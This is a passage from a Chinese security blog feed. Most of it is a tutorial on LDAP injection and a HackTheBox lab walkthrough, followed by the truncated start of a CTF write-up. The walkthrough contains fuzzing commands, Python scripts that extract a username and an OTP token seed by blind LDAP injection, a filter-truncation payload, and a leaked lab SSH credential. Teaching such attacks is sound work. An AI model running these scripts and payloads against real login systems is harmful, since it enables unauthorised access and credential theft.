class="line">(|(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>类似的，加入现在用于展示可用资源的查询为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(type&#x3D;Rsc1)(type&#x3D;Rsc2))</span><br></pre></td></tr></table></figure><p>Rsc1和Rsc2表示系统中不同种类的资源。如果攻击者输入<code>Rsc=printer)(uid=*)</code>，则下面的查询被发送给服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner)</span><br></pre></td></tr></table></figure><p>这样也会造成注入的产生。</p><h3 id="盲注">盲注</h3><p>SQL注入中有盲注，LDAP中也存在这种问题，包括下面介绍到的靶机用到的也是盲注的手法。</p><p>假设攻击者可以从服务器响应中推测出什么，尽管应用没有报出错信息，LDAP过滤器中注入的代码却生成了有效的响应或错误。攻击者可以利用这一行为向服务器问正确的或错误的问题。</p><p>还是用一个例子来说明。</p><p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure><p>使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void</span><br></pre></td></tr></table></figure><p>Web应用会构造如下查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure><p><strong>仅第一个LDAP过滤器会被处理</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))</span><br></pre></td></tr></table></figure><p>那么这样就和我们查询的初衷相违背了。</p><p>接下来就是这篇文章的重头戏了，我们主要从这个靶机中学到两点：</p><ul><li>怎么发现LDAP注入漏洞</li><li>如何利用LDAP注入漏洞</li></ul><h2 id="0x03-从HTB靶机中学习LDAP注入">0x03 从HTB靶机中学习LDAP注入</h2><h3 id="Initial-Enunciation">Initial Enunciation</h3><p>拿到靶机先用Nmap扫一下端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure><p>查看80端口</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p><p>大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。</p><p>再去登录界面看一下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p><p>提示我们是一个OTP，即One Time Password，一般而言是1分钟更新一次。</p><p>查看源码，发现有一个Hint</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p><blockquote><p>如果比较熟悉LDAP的话，这里的两个名词schema和existing attribute已经提示了是关于LDAP注入。</p></blockquote><p>作者用一个已知的属性去存储了81位的token string，Google搜一下<code>token string (81 digits)</code>。</p><blockquote><p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p></blockquote><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" /><p>可以看到一个关键的地方，<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。那么主要是找到token，唯一可以利用的就是这个登录框了。</p><p>先随便用某个用户名和密码登录<code>admin:1234</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p><p>返回<code>User admin not found</code>，再用SQL注入的万能密码试一试</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p><p>直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p><blockquote><p>–hw 233 代表过滤掉形如<code>User xxx not found</code>的返回信息。</p></blockquote><p>我们发现<code>+</code>和<code>&amp;</code>返回的是232 Words，但是在页面测试一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p><p>发现返回的还是<code>User + not found</code>或者<code>User &amp; not found</code>，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。</p><p>我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble_uri_hex.txt作为字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p><p>最后Fuzz出来的被过滤的字符就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure><p>这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合<code>login.php</code>页面源代码中的hint，可以确定是LDAP注入。</p><h3 id="Getting-User-Access">Getting User Access</h3><p>先来看LDAP注入的最基本形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回<code>User ca01h not found</code>。</p><p>假设只有一个括号：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p><p>假设有两个括号：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p><p>假设有三个括号：</p><p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p><p>当尝试到三个括号用于闭合时，成功返回了<code>User ca01h%29%29%29%00 not found</code>，那么这个登录框的LDAP查询的基本形式就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ca01h)))%00</span><br><span class="line">)</span><br><span class="line">(&amp;|</span><br><span class="line">(other comparing)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中<code>%25%2a</code>返回的消息长度为231 Words</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p><p>发现回显的消息是<code>Cannot login</code>，说明可以用<code>*</code>通配符来盲注用户名，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line"><span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">username += c</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p><p>用户名为<code>ldapuser</code></p><p>知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>中找到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure><p>如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ldapuser)</span><br><span class="line">(FUZZ&#x3D;*)</span><br><span class="line">)</span><br><span class="line">(&amp;|</span><br><span class="line">(other comparing)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>此外还要把注入的字符<code>ldapuser)(FUZZ=*</code>进行二次URL编码，编码之后的结果<code>ldapuser%2529%2528FUZZ%253d%252a</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p><p>我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本用来burp81位token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p><p>这里值得注意的是需要删掉最后的一个9，所以最后的token就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure><p>接着用stoken工具导入token</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p><p>生成OTP</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p><p>成功登录后，跳转到<code>page.php</code>页面，可以执行命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p><p>Damn it…提示我们<code>ldapuser</code>权限不够不能执行命令，这里有两种办法：</p><ul><li><p>对<code>group</code>属性进行注入，即把后面group属性的filter截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(pager&#x3D;&lt;token&gt;)</span><br><span class="line">(uid&#x3D;ldapuser)))%00</span><br><span class="line">)</span><br><span class="line">(|</span><br><span class="line">(group&#x3D;root)</span><br><span class="line">(group&#x3D;adm)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>使用<code>*</code>通配符作为用户名登录</p></li></ul><p>这里演示一下第一种方案，payload直接放到burp中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p><p>再去执行ls命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p><p>读取page.php文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p><p>SSH登录：<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;文章首发于 安全客&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;从HTB靶机中浅谈LDAP注入攻击&quot;&gt;从HTB靶机中浅谈LDAP注入攻击&lt;/h1&gt;
&lt;p&gt;最近在HackTheBox上氪了金（肉疼😭），做了一些已经retired的高质量靶机
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="LDAP" scheme="http://ca0y1h.top/tags/LDAP/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——Ruby及Go</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo/</id>
    <published>2020-08-18T12:27:10.000Z</published>
    <updated>2020-08-18T12:28:09.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SCTF2019-Flag-Shop">SCTF2019 Flag Shop</h2><h3 id="考点">考点</h3><ul><li>JWT伪造</li><li>Ruby SSTI</li></ul><h3 id="解题">解题</h3><h4 id="解法1">解法1</h4><p>打开靶机，查看源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 style=<span class="string">&quot;text-align: center&quot;</span>&gt;Flag Shop&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">Your uid is &lt;b id=<span class="string">&quot;uid&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Your JinKela is &lt;b id=<span class="string">&quot;jkl&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Flag Price: <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span>1000000000000000000000000000<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&lt;hr /&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=<span class="string">&quot;buyFlag()&quot;</span> style=<span class="string">&quot;text-align: left&quot;</span>&gt;buy flag&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;reset()&quot;</span> style=<span class="string">&quot;text-align: center&quot;</span>&gt;reset&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;work()&quot;</span> style=<span class="string">&quot;text-align: right&quot;</span>&gt;work&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buyFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/shop&quot;</span>, &#123;</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// or &#x27;PUT&#x27;</span></span><br><span class="line">            headers: <span class="keyword">new</span> Headers(&#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">            .then(<span class="function"><span class="params">res</span> =&gt;</span> res.text())</span><br><span class="line"></span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                    alert(response)</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            .catch(<span class="function"><span class="params">error</span> =&gt;</span>alert(error))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(confirm(<span class="string">&quot;This will reset all Jinkelas , Are U Sure?&quot;</span>))&#123;</span><br><span class="line">            fetch(<span class="string">&quot;/api/auth&quot;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/work?name=bot&amp;do=bot is working&quot;</span>)</span><br><span class="line">            .then(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&quot;/api/info&quot;</span>,&#123;</span><br><span class="line">            redirect: <span class="string">&#x27;manual&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(res.ok)&#123;</span><br><span class="line">              <span class="keyword">return</span> res.json()</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              fetch(<span class="string">&quot;/api/auth&quot;</span>)</span><br><span class="line">              reject;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> info = res;</span><br><span class="line">            <span class="built_in">console</span>.log(info);</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;uid&quot;</span>).innerText = 